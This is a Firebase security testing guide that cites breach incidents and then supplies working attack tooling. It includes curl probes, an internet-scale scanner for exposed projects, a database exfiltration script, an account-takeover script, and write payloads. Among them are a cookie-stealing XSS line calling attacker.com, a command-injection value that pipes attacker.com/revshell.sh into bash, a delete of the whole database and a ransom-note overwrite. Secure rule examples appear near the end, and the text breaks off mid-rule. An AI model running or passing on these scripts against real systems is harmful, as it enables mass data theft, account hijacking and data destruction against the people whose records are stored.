# Firebase Security Testing Guide

## Overview

Firebase is a Backend-as-a-Service (BaaS) platform developed by Google, providing developers with tools for database management, authentication, cloud storage, and hosting. It is widely used in mobile and web applications due to its real-time capabilities and scalable infrastructure.

From a security perspective, Firebase misconfigurations represent one of the most common and dangerous vulnerabilities in modern applications. The platform's default settings prioritize ease of development over security, and many developers fail to implement proper access controls before moving to production. These misconfigurations can lead to severe data exposure, unauthorized access, privilege escalation, and complete account takeover.

---

## Real-World Incident Examples

### Tea App Data Breach (July 2025)

The Tea App, a women-only dating safety platform, suffered a catastrophic data breach due to a misconfigured Firebase storage bucket. The exposure affected approximately 72,000 images and 1.1 million private messages exchanged between February 2023 and July 2025 .

**Exposed Data Included:**
- 13,000 verification selfies and government-issued photo IDs submitted during account creation
- 59,000 images shared within the app through posts, comments, and direct messages
- 1.1 million private messages containing sensitive discussions about divorce, rape, addresses, and phone numbers 

**Attack Vector:** The Firebase storage bucket was left publicly accessible without proper authentication controls. Anyone with the correct URL could access the stored data. The breach was first exposed on 4chan, where users shared links to the compromised data, leading to rapid distribution across BitTorrent and other platforms. Attackers also created maps using EXIF location data from leaked images, further escalating privacy violations .

**Root Cause:** Tea's custom-built API was properly secured, but the Firebase storage system was misconfigured with overly permissive access rules. The company had archived user data to meet law enforcement requirements around cyberbullying but failed to secure the legacy storage system properly .

### FirebaseWreck (May 2024)

Security researchers Logykk, mrbruh, and xyzeva discovered a widespread vulnerability affecting hundreds of websites using Firebase. The researchers scanned the entire internet and identified approximately 550,000 sites with configurations that could potentially lead to Firebase misconfigurations. After further testing, they confirmed that hundreds of sites had exposed a total of 125 million sensitive records .

**Exposed Data Statistics:**
- Total records exposed: 124,605,664
- Names: 84,221,169
- Email addresses: 106,266,766
- Phone numbers: 33,559,863
- Passwords (plaintext): 20,185,831
- Bank account and billing information: 27,487,924 

**Discovery Method:** The researchers initially discovered the issue on a service called Chatter.ai, where the application properly restricted account privileges through the official website registration but allowed full database access when users created accounts directly using the Firebase API. This inconsistency led to a large-scale internet scan that revealed systemic security failures across thousands of applications .

**Response:** The researchers sent 842 emails over 13 days to affected sites. Only 24% corrected their configurations, 1% responded to the notifications, and two sites offered bug bounties. One online gambling site that had exposed 10 million plaintext passwords and 8 million bank account records responded with inappropriate, flirtatious messages instead of addressing the security issue .

### Photo and Document Apps Exposure (February 2026)

Multiple Android applications, including Smart AI Identifier, Beauty Face Plus, and Camera Translator, exposed user data affecting approximately 152,000 users due to misconfigured Firebase storage and database settings. The exposed records included user-uploaded content and account-related metadata. These consumer-facing photo and document applications frequently handle identity-adjacent data, including images of identification documents and other sensitive personal media .

### Investory App API Key Exposure (March 2026)

A hardcoded Google Firebase API key was discovered in the Android application app.investory.toyfactory version 1.5.5, located in assets/google-services-desktop.json. An attacker can extract this key and use it to anonymously authenticate with the Firebase Identity Toolkit. Once an anonymous user is created, the resulting ID token can be used to query the associated Firebase Realtime Database. Depending on database security rules, this may grant unauthorized read access to sensitive user data .

---

## Common Misconfigurations

### Insecure Realtime Database

Firebase Realtime Database is a NoSQL cloud database that synchronizes data in real-time. Security is enforced through JSON-based security rules that determine read and write access. The most dangerous misconfiguration occurs when developers set `.read` and `.write` rules to `true`, making the database accessible to anyone on the internet.

**Testing for Open Database Access:**

```bash
# Test for open database (no authentication required)
# This is the most basic check - if returns data, the database is completely open
curl https://PROJECT-ID.firebaseio.com/.json

# If returns data = VULNERABLE
# If returns "Permission Denied" = properly configured

# Test for write access - try to insert your own data
curl -X PUT -d '{"test": "data"}' https://PROJECT-ID.firebaseio.com/test.json

# Test with shallow query to list only keys without fetching all data
# This is useful for large databases where full enumeration would be slow
curl "https://PROJECT-ID.firebaseio.com/.json?shallow=true"

# Test for specific paths that commonly contain sensitive data
curl https://PROJECT-ID.firebaseio.com/users.json
curl https://PROJECT-ID.firebaseio.com/admin.json
curl https://PROJECT-ID.firebaseio.com/credentials.json
curl https://PROJECT-ID.firebaseio.com/passwords.json
```

### Insecure Cloud Firestore

Cloud Firestore is Firebase's newer database solution with more structured data organization and different security rule syntax. The critical misconfiguration is similar: rules that allow read or write access when `request.auth` is not validated.

**Testing Firestore Security:**

```bash
# Firestore uses different URL patterns than Realtime Database
# Direct REST API testing requires the Firebase SDK or properly formatted REST calls

# Check Firestore REST API endpoint
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# This endpoint typically requires authentication
# If it returns data without auth, rules are misconfigured

# In Firebase Console, the vulnerable rule pattern appears as:
# match /{document=**} {
#   allow read, write: if true;
# }

# More subtle vulnerable pattern:
# match /{document=**} {
#   allow read: if true;
#   allow write: if request.auth != null;
# }
# This still exposes all data for reading
```

**Firestore Rule Analysis:**

Proper Firestore security should follow least privilege principles:
```javascript
// Vulnerable - allows public access to everything
match /{document=**} {
  allow read, write: if true;
}

// Vulnerable - allows public read access
match /{document=**} {
  allow read: if true;
  allow write: if request.auth != null;
}

// Secure - requires authentication AND ownership
match /users/{userId} {
  allow read, write: if request.auth != null && request.auth.uid == userId;
}
```

### Insecure Storage Buckets

Firebase Storage uses Google Cloud Storage buckets for file storage. Misconfigured buckets allow unauthorized users to list, download, and upload files without authentication.

**Testing Storage Buckets:**

```bash
# Firebase Storage bucket naming convention: PROJECT-ID.appspot.com

# Test using Google Cloud SDK
gsutil ls gs://PROJECT-ID.appspot.com/
gsutil ls -r gs://PROJECT-ID.appspot.com/  # Recursive listing

# Via HTTP direct access - bucket listing
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o"

# List all files with pagination (maxResults up to 1000)
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o?maxResults=1000"

# Download specific file - note the URL encoding requirement
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/FILENAME?alt=media"

# For files with special characters in name
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/users%2Fprofile.jpg?alt=media"

# List files with prefix filter
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o?prefix=users/"
```

---

## Enumeration Techniques

### Finding Firebase Projects from Mobile Applications

Mobile applications must include Firebase configuration to connect to their backend. These configurations are embedded in the application package and can be extracted with standard reverse engineering tools.

**Android APK Extraction:**

```bash
# Decompile APK using apktool
apktool d target-app.apk
cd target-app/

# Search for Firebase-related strings across all files
grep -r "firebaseio.com" .
grep -r "firebaseapp.com" .
grep -r "appspot.com" .
grep -r "google-services.json" .

# Look for Firebase configuration files
find . -name "google-services.json"
find . -name "*.json" | xargs grep -l "firebase"

# Extract from google-services.json using jq for structured output
cat google-services.json | jq '.project_info.firebase_url'
cat google-services.json | jq '.project_info.storage_bucket'
cat google-services.json | jq '.project_info.project_id'

# Extract all API keys and sensitive configuration
cat google-services.json | jq '.client[0].client_info'
cat google-services.json | jq '.client[0].services[].api_key'
```

**iOS Application Extraction:**

```bash
# iOS apps store Firebase config in property list files
# Extract IPA and look for GoogleService-Info.plist

# Search for plist files containing Firebase configuration
find . -name "GoogleService-Info.plist"
find . -name "*.plist" | xargs grep -l "FIREBASE"

# Extract values from plist
plutil -p GoogleService-Info.plist
cat GoogleService-Info.plist | grep -E "API_KEY|PROJECT_ID|DATABASE_URL"
```

**Web Application Extraction:**

```bash
# Web applications expose Firebase config in JavaScript
# Look for Firebase initialization code

# Search JavaScript files for Firebase configuration patterns
grep -Eo "[a-z0-9-]+\.firebaseio\.com" *.js
grep -Eo "apiKey.*AIza[A-Za-z0-9_-]{35}" *.js
grep -Eo "projectId.*\"([a-z0-9-]+)\"" *.js

# Common Firebase config object pattern
# var firebaseConfig = {
#   apiKey: "AIza...",
#   authDomain: "project.firebaseapp.com",
#   databaseURL: "https://project.firebaseio.com",
#   projectId: "project-id",
#   storageBucket: "project.appspot.com",
#   messagingSenderId: "123456789",
#   appId: "1:123456789:web:..."
# };

# Extract using regex with context
grep -B5 -A10 "firebase.initializeApp" *.js
```

### API Key and Credential Extraction

Firebase API keys are designed to be public and embedded in client applications. However, when combined with misconfigured security rules, these exposed keys become a critical vulnerability. The key pattern is consistent and searchable.

```bash
# Firebase API key pattern: AIza followed by 35 alphanumeric and underscore/dash characters
# Pattern: AIza[A-Za-z0-9_-]{35}

# Search all files recursively for API keys
grep -rEo "AIza[A-Za-z0-9_-]{35}" .

# Search with context to identify the service
grep -rE "AIza[A-Za-z0-9_-]{35}" . -B2 -A2

# Project ID pattern - used to construct Firebase endpoints
grep -rEo "[a-z0-9-]{5,30}\.firebaseapp\.com" .

# Full config extraction for complete Firebase access
grep -rEo '"apiKey"\s*:\s*"AIza[A-Za-z0-9_-]{35}"' .
grep -rEo '"authDomain"\s*:\s*"[a-z0-9-]+\.firebaseapp\.com"' .
grep -rEo '"databaseURL"\s*:\s*"https://[a-z0-9-]+\.firebaseio\.com"' .
grep -rEo '"storageBucket"\s*:\s*"[a-z0-9-]+\.appspot\.com"' .
```

### Automated Scanning Approach

Large-scale Firebase enumeration requires systematic scanning. The FireWreck research team demonstrated effective methodologies for identifying vulnerable instances at internet scale .

```python
#!/usr/bin/env python3
"""
Firebase Project Enumeration Scanner
Based on methodologies from FireWreck research
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class FirebaseScanner:
    def __init__(self, project_ids_file, threads=50):
        self.project_ids = self.load_project_ids(project_ids_file)
        self.threads = threads
        self.results = []
    
    def load_project_ids(self, filename):
        """Load project IDs from wordlist or extracted list"""
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def test_database(self, project_id):
        """Test if Realtime Database is publicly accessible"""
        url = f"https://{project_id}.firebaseio.com/.json"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                # Check if data exists (not just empty)
                if response.text and response.text != "null":
                    return {
                        "project_id": project_id,
                        "vulnerable": True,
                        "type": "realtime_database",
                        "sample": response.text[:500]
                    }
        except:
            pass
        return None
    
    def test_firestore(self, project_id):
        """Test if Firestore is publicly accessible"""
        url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return {
                    "project_id": project_id,
                    "vulnerable": True,
                    "type": "firestore",
                    "sample": response.text[:500]
                }
        except:
            pass
        return None
    
    def test_storage(self, project_id):
        """Test if Storage bucket is publicly accessible"""
        url = f"https://firebasestorage.googleapis.com/v0/b/{project_id}.appspot.com/o"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('items'):
                    return {
                        "project_id": project_id,
                        "vulnerable": True,
                        "type": "storage",
                        "file_count": len(data['items']),
                        "sample": data['items'][:5]
                    }
        except:
            pass
        return None
    
    def scan(self):
        """Execute full scan across all endpoints"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for project_id in self.project_ids:
                futures.append(executor.submit(self.test_database, project_id))
                futures.append(executor.submit(self.test_firestore, project_id))
                futures.append(executor.submit(self.test_storage, project_id))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)
        
        return self.results

if __name__ == "__main__":
    scanner = FirebaseScanner("project_ids.txt")
    results = scanner.scan()
    print(json.dumps(results, indent=2))
```

---

## Exploitation Techniques

### Complete Data Exfiltration from Realtime Database

Once an open Firebase database is identified, attackers can systematically extract all stored data. The following script demonstrates comprehensive data extraction with support for large databases.

```python
#!/usr/bin/env python3
"""
Firebase Data Exfiltration Tool
For testing purposes only - use only on authorized targets
"""

import requests
import json
import sys
import time
from datetime import datetime

class FirebaseExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def get_all_data(self):
        """Attempt to retrieve all data from the database"""
        url = f"{self.base_url}/.json"
        response = self.session.get(url)
        
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Access denied: {response.status_code}")
            return None
    
    def get_keys_only(self):
        """Get only top-level keys for large databases"""
        url = f"{self.base_url}/.json?shallow=true"
        response = self.session.get(url)
        
        if response.status_code == 200:
            return response.json()
        return None
    
    def enumerate_collection(self, path):
        """Enumerate a specific collection path"""
        url = f"{self.base_url}/{path}.json"
        response = self.session.get(url)
        
        if response.status_code == 200:
            return response.json()
        return None
    
    def save_data(self, data, filename):
        """Save extracted data to file"""
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"Data saved to {filename}")
    
    def exfiltrate_all(self, output_prefix="firebase_dump"):
        """Complete exfiltration routine"""
        print(f"[*] Targeting: {self.base_url}")
        
        # First try shallow enumeration to understand structure
        print("[*] Performing shallow enumeration...")
        keys = self.get_keys_only()
        
        if keys is None:
            print("[!] Cannot access database or database is empty")
            return
        
        if isinstance(keys, dict):
            print(f"[+] Found {len(keys)} top-level collections")
            
            # Extract each collection
            all_data = {}
            for key in keys.keys():
                print(f"[*] Extracting: {key}")
                data = self.enumerate_collection(key)
                if data:
                    all_data[key] = data
                    time.sleep(0.5)  # Rate limiting
        else:
            # Direct data access
            all_data = self.get_all_data()
        
        if all_data:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{output_prefix}_{timestamp}.json"
            self.save_data(all_data, filename)
            self.analyze_sensitive_data(all_data)
    
    def analyze_sensitive_data(self, data):
        """Search for common sensitive data patterns"""
        sensitive_patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone': r'\+?[\d\s-]{10,15}',
            'password': r'password[\'"]?\s*:\s*[\'"]?([^\'"]+)',
            'token': r'[A-Za-z0-9_\-]{20,}',
            'ssn': r'\d{3}-\d{2}-\d{4}',
            'credit_card': r'\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}'
        }
        
        data_str = json.dumps(data).lower()
        findings = {}
        
        for pattern_name, pattern in sensitive_patterns.items():
            import re
            matches = re.findall(pattern, data_str, re.IGNORECASE)
            if matches:
                findings[pattern_name] = len(matches)
        
        if findings:
            print("\n[!] Sensitive Data Detection:")
            for pattern, count in findings.items():
                print(f"    - {pattern}: {count} potential matches")

# Example usage
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 firebase_exploit.py <firebase_url>")
        print("Example: python3 firebase_exploit.py https://example.firebaseio.com")
        sys.exit(1)
    
    exploiter = FirebaseExploit(sys.argv[1])
    exploiter.exfiltrate_all()
```

### Authentication Bypass via API Key Exploitation

The FireWreck research revealed that many applications restrict access through their official website but leave Firebase APIs exposed. Attackers can bypass these restrictions by directly interacting with Firebase endpoints . A similar technique was demonstrated by security researcher VETTRIVEL U, who escalated an API key disclosure to complete authentication bypass and account takeover .

```bash
# Step 1: Extract API key from application (example: AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12345678)
API_KEY="AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12345678"

# Step 2: Create an anonymous account using the exposed API key
# This works even if the application doesn't normally allow anonymous auth
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "returnSecureToken": true
  }'

# Response contains idToken, localId, and refreshToken
# Example response:
# {
#   "kind": "identitytoolkit#SignupNewUserResponse",
#   "idToken": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
#   "email": "",
#   "refreshToken": "AMf-vBx...",
#   "expiresIn": "3600",
#   "localId": "abc123def456"
# }

# Step 3: Create an account with email/password (if email enumeration is possible)
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "SuperSecret123!",
    "returnSecureToken": true
  }'

# Step 4: Use the obtained idToken to access Firebase services
ID_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6..."

# Access Realtime Database with the token
curl "https://PROJECT-ID.firebaseio.com/.json?auth=${ID_TOKEN}"

# Access Firestore with Bearer token
curl -H "Authorization: Bearer ${ID_TOKEN}" \
  "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# Step 5: If the application has custom auth, try to escalate privileges
# Some applications use Firebase Custom Tokens - check for exposed service accounts
```

### Complete Account Takeover Chain

The following demonstrates a full account takeover chain starting from an exposed Firebase API key, as documented by multiple bug bounty researchers :

```python
#!/usr/bin/env python3
"""
Firebase Account Takeover Exploit
Demonstrates privilege escalation from API key exposure
"""

import requests
import json
import re

class FirebaseAccountTakeover:
    def __init__(self, api_key, project_id):
        self.api_key = api_key
        self.project_id = project_id
        self.id_token = None
        self.local_id = None
        self.refresh_token = None
    
    def create_anonymous_session(self):
        """Create anonymous Firebase session"""
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}"
        data = {"returnSecureToken": True}
        
        response = requests.post(url, json=data)
        if response.status_code == 200:
            result = response.json()
            self.id_token = result.get('idToken')
            self.local_id = result.get('localId')
            self.refresh_token = result.get('refreshToken')
            print(f"[+] Anonymous session created: {self.local_id}")
            return True
        print(f"[-] Anonymous auth failed: {response.status_code}")
        return False
    
    def list_all_users(self):
        """Attempt to enumerate users (requires admin privileges)"""
        # This endpoint requires a service account or admin SDK
        # May be exposed if security rules are misconfigured
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/downloadAccount?key={self.api_key}"
        headers = {"Authorization": f"Bearer {self.id_token}"}
        
        response = requests.post(url, headers=headers, json={"maxResults": 100})
        if response.status_code == 200:
            users = response.json().get('users', [])
            print(f"[+] Found {len(users)} users")
            return users
        return []
    
    def change_user_password(self, target_email, new_password):
        """Attempt password reset (if no email verification required)"""
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={self.api_key}"
        data = {
            "email": target_email,
            "password": new_password,
            "returnSecureToken": True
        }
        
        # This requires the current idToken or admin privileges
        if self.id_token:
            data["idToken"] = self.id_token
        
        response = requests.post(url, json=data)
        return response.status_code == 200
    
    def access_protected_resources(self):
        """Access Firebase resources using stolen session"""
        # Realtime Database
        db_url = f"https://{self.project_id}.firebaseio.com/.json"
        headers = {"Authorization": f"Bearer {self.id_token}"}
        
        response = requests.get(db_url, headers=headers)
        if response.status_code == 200:
            print(f"[+] Database access successful")
            return response.json()
        
        # Firestore
        fs_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        response = requests.get(fs_url, headers=headers)
        if response.status_code == 200:
            print(f"[+] Firestore access successful")
            return response.json()
        
        return None
    
    def full_exploit_chain(self):
        """Execute complete attack chain"""
        print(f"[*] Starting exploit chain against {self.project_id}")
        
        if not self.create_anonymous_session():
            print("[!] Cannot proceed without valid session")
            return
        
        # Attempt to escalate to privileged access
        data = self.access_protected_resources()
        if data:
            print("[!] VULNERABLE: Unauthenticated access to protected resources")
            # Save compromised data
            with open("compromised_data.json", "w") as f:
                json.dump(data, f, indent=2)

# Example usage
if __name__ == "__main__":
    # These would be extracted from the target application
    API_KEY = "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12345678"
    PROJECT_ID = "vulnerable-app-12345"
    
    exploit = FirebaseAccountTakeover(API_KEY, PROJECT_ID)
    exploit.full_exploit_chain()
```

### Write Access Exploitation

When write permissions are misconfigured, attackers can modify, inject, or delete data. This can lead to defacement, stored XSS attacks, or complete service disruption.

```bash
# Test write access by creating a test entry
curl -X PUT -d '{"test": "security_test"}' \
  "https://PROJECT-ID.firebaseio.com/test_entry.json"

# If successful, delete the test entry
curl -X DELETE "https://PROJECT-ID.firebaseio.com/test_entry.json"

# Modify existing user data (privilege escalation)
# Example: change a user's role to admin
curl -X PATCH -d '{"role": "admin"}' \
  "https://PROJECT-ID.firebaseio.com/users/victim_user_id.json"

# Inject malicious content for stored XSS
# This is especially dangerous if the app displays this data without sanitization
curl -X PUT -d '{"content": "<script>fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)</script>"}' \
  "https://PROJECT-ID.firebaseio.com/posts/malicious.json"

# Bulk delete or ransom attack (deletes all data)
# WARNING: This is destructive - only test on authorized systems
curl -X DELETE "https://PROJECT-ID.firebaseio.com/.json"

# Overwrite entire collections
curl -X PUT -d '{"ransom_message": "Your data has been encrypted. Pay 1 BTC to recover"}' \
  "https://PROJECT-ID.firebaseio.com/.json"

# Add malicious authentication entries
curl -X PUT -d '{"email": "attacker@evil.com", "password": "pwned123"}' \
  "https://PROJECT-ID.firebaseio.com/users.json"
```

### Cloud Functions Exploitation

Firebase Cloud Functions can introduce additional attack vectors. A critical vulnerability (CVSS 9.9) was documented in December 2025 demonstrating unauthenticated RCE through Firebase Firestore combined with CSP wildcard misconfigurations .

```bash
# Firebase Cloud Functions follow predictable URL patterns
# Format: https://REGION-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME

# Common regions: us-central1, europe-west1, asia-east1

# Enumerate functions by attempting common names
FUNCTIONS=("api" "webhook" "auth" "process" "handleRequest" "createUser" "getData")

for func in "${FUNCTIONS[@]}"; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://us-central1-PROJECT-ID.cloudfunctions.net/${func}"
done

# Test for authentication bypass on functions
curl -X POST "https://us-central1-PROJECT-ID.cloudfunctions.net/createUser" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com", "password": "pwned123"}'

# Test for SSRF in functions that fetch external URLs
curl -X POST "https://us-central1-PROJECT-ID.cloudfunctions.net/fetchImage" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'  # AWS metadata endpoint

# Test for command injection in functions that execute system commands
curl -X POST "https://us-central1-PROJECT-ID.cloudfunctions.net/processFile" \
  -d '{"filename": "test; curl http://attacker.com/revshell.sh | bash"}'

# Test for path traversal in file operations
curl "https://us-central1-PROJECT-ID.cloudfunctions.net/getFile?path=../../../etc/passwd"
```

---

## Automated Tools

### Firebase Scanner by Turr0n

```bash
# https://github.com/Turr0n/firebase
# Automated scanner for Firebase misconfigurations

# Installation
git clone https://github.com/Turr0n/firebase
cd firebase
pip install -r requirements.txt

# Basic usage - scan single project
python3 firebase.py -p PROJECT_ID

# Scan with DNS dumpster enumeration
python3 firebase.py -p PROJECT_ID --dnsdumpster

# Scan from file containing list of project IDs
python3 firebase.py -l projects.txt

# Output results to file
python3 firebase.py -p PROJECT_ID -o results.json
```

### Insecure-Firebase-Exploit

```bash
# https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit
# Python exploit for writing to insecure Firebase databases 

git clone https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit
cd Insecure-Firebase-Exploit

# Basic usage
python3 Firebase_Exploit.py

# The tool tests for write access and can:
# - Write custom data to vulnerable databases
# - Enumerate existing data
# - Test security rules
```

### Firebase-Extractor

```bash
# https://github.com/viperbluff/Firebase-Extractor
# Tool for extracting data from Firebase instances

python3 firebase.py xyz.firebaseio.com

# Features:
# - Automatic data extraction
# - Recursive enumeration
# - JSON output formatting
```

### Baserunner

```bash
# https://github.com/iosiro/baserunner
# Comprehensive Firebase security assessment tool

# Installation
npm install -g baserunner

# Basic usage with config file
baserunner -c config.json

# Example config.json:
# {
#   "firebaseUrl": "https://project-id.firebaseio.com",
#   "apiKey": "AIzaSy...",
#   "rulesFile": "rules.json"
# }

# Test security rules
baserunner test-rules --rules rules.json
```

### Catalyst Scanner

The FireWreck research team developed a secondary scanning tool called Catalyst specifically for checking read access to common Firebase databases. The tool was used in their large-scale internet scan that identified over 900 vulnerable sites .

```python
# Simplified Catalyst-style scanner
# Scans for common database names and tests read access

import requests
from concurrent.futures import ThreadPoolExecutor

COMMON_PATHS = [
    "users", "user", "accounts", "profile", "profiles",
    "messages", "chats", "conversations",
    "posts", "comments", "feed",
    "admin", "administrators",
    "config", "settings", "secrets",
    "tokens", "keys", "credentials"
]

def scan_path(base_url, path):
    url = f"{base_url}/{path}.json"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and response.text not in ["null", "{}"]:
            return {"path": path, "data": response.json()}
    except:
        pass
    return None

def catalyst_scan(firebase_url):
    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_path, firebase_url, path) for path in COMMON_PATHS]
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    return results
```

---

## Python Connector for Firebase

### Pyrebase Implementation

```python
# https://github.com/thisbejim/Pyrebase
# Full-featured Firebase REST API wrapper

import pyrebase
import json

# Firebase configuration - extracted from target application
config = {
    "apiKey": "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz12345678",
    "authDomain": "project-id.firebaseapp.com",
    "databaseURL": "https://project-id.firebaseio.com",
    "storageBucket": "project-id.appspot.com"
}

# Initialize Firebase
firebase = pyrebase.initialize_app(config)

# Authentication
auth = firebase.auth()

# Attempt anonymous authentication
try:
    user = auth.sign_in_anonymous()
    print(f"Authenticated as: {user['localId']}")
    id_token = user['idToken']
except:
    print("Anonymous auth failed - may be disabled")
    id_token = None

# Database access
db = firebase.database()

# Read all data (if rules allow)
try:
    all_data = db.get()
    print("Full database contents:")
    print(json.dumps(all_data.val(), indent=2))
except Exception as e:
    print(f"Read access denied: {e}")

# Read specific child
try:
    users = db.child("users").get()
    for user in users.each():
        print(f"User: {user.key()} -> {user.val()}")
except:
    print("Cannot access users collection")

# Write data (if rules allow)
try:
    result = db.child("test").set({"test_key": "test_value"})
    print("Write successful")
except:
    print("Write access denied")

# Push data (auto-generated key)
try:
    result = db.child("messages").push({
        "from": "attacker",
        "message": "This is a test",
        "timestamp": firebase.database().generate_timestamp()
    })
    print(f"Message pushed with key: {result['name']}")
except:
    print("Push access denied")

# Update existing data
try:
    db.child("users/attacker").update({"privilege": "admin"})
    print("Update successful")
except:
    print("Update access denied")

# Storage operations
storage = firebase.storage()

# List files in storage bucket
try:
    # Pyrebase doesn't directly support listing - use REST API
    import requests
    url = f"https://firebasestorage.googleapis.com/v0/b/{config['storageBucket']}/o"
    response = requests.get(url)
    if response.status_code == 200:
        files = response.json().get('items', [])
        print(f"Found {len(files)} files in storage")
        for file in files:
            print(f"  - {file['name']}")
except:
    print("Cannot list storage bucket")

# Download file
try:
    storage.child("path/to/file.jpg").download("downloaded_file.jpg")
    print("File downloaded")
except:
    print("Cannot download file")
```

### Firebase Admin SDK for Server-Side Testing

```python
# Firebase Admin SDK requires service account credentials
# Use only for authorized testing

import firebase_admin
from firebase_admin import credentials, auth, firestore, storage

# Initialize with service account (from compromised or exposed JSON)
cred = credentials.Certificate("path/to/serviceAccountKey.json")
firebase_admin.initialize_app(cred, {
    'storageBucket': 'project-id.appspot.com'
})

# List all users (requires admin privileges)
def enumerate_users():
    users = []
    page = auth.list_users()
    for user in page.users:
        users.append({
            'uid': user.uid,
            'email': user.email,
            'display_name': user.display_name,
            'disabled': user.disabled,
            'email_verified': user.email_verified
        })
    return users

# Access Firestore with full privileges
db = firestore.client()
def dump_firestore():
    collections = db.collections()
    data = {}
    for collection in collections:
        docs = collection.stream()
        data[collection.id] = [doc.to_dict() for doc in docs]
    return data

# Access Storage
bucket = storage.bucket()
def list_storage():
    blobs = bucket.list_blobs()
    return [{'name': blob.name, 'size': blob.size, 'updated': blob.updated} for blob in blobs]
```

---

## Security Rules Analysis

### Understanding Firebase Security Rules

Firebase Realtime Database and Cloud Firestore use declarative security rules to control access. The most critical rule determines read and write access at the root level. Misconfigured rules are the primary cause of Firebase data breaches.

**Realtime Database Rules Structure:**

```javascript
// Firebase Realtime Database security rules (database.rules.json)

// CRITICAL VULNERABILITY: Full public access
// This configuration allows ANYONE on the internet to read and write ALL data
// DO NOT USE IN PRODUCTION - FOR TESTING ONLY
{
  "rules": {
    ".read": true,
    ".write": true
  }
}

// HIGH RISK: Authenticated access only
// This is still risky because any authenticated user can access all data
// An attacker who creates a free account gains full access
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}

// MEDIUM RISK: Per-user data but no validation
// User data is separated by UID but no validation on write
// Attackers can still read others' data if UIDs are predictable
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    }
  }
}

// PROPER CONFIGURATION: Secure with validation
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid && newData.hasChildren(['email', 'name'])",
        ".validate": "newData.child('email').isString() && newData.child('email').matches(/^[^@]+@[^@]+$/)"      }
    },
    "public": {
      ".read": true,
      ".write": false
    },
    "private_messages": {
      "$messageId": {
        ".read": "data.child('recipient').val() === auth.uid || data.child('sender').val() === auth.uid",
        ".write": "auth.uid === data.child('sender').val()"
      }
    }
  }
}
```

**Cloud Firestore Rules Structure:**

```javascript
// Cloud Firestore security rules (firestore.rules)

// CRITICAL VULNERABILITY: Full public access
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;
    }
  }
}

// HIGH RISK: Authenticated-only access
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if request.auth != null;
    }
  }
}

// DANGEROUS: Public read, authenticated write
// Attackers can read all data without any authentication
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read: if true;
      allow write: if request.auth != null;
    }
  }
}

// PROPER CONFIGURATION: Granular per-user access
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // User profiles - only the user can read/write their own
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
    
    // Public posts - anyone can read, only authors can write/update
    match /posts/{postId} {
      allow read: if true;
      allow create: if request.auth != null;
      allow update, delete: if request.auth != null && request.auth.uid == resource.data.authorId;
    }
    
    // Private messages - only sender and recipient can access
    match /messages/{messageId} {
      allow read: if request.auth != null && 
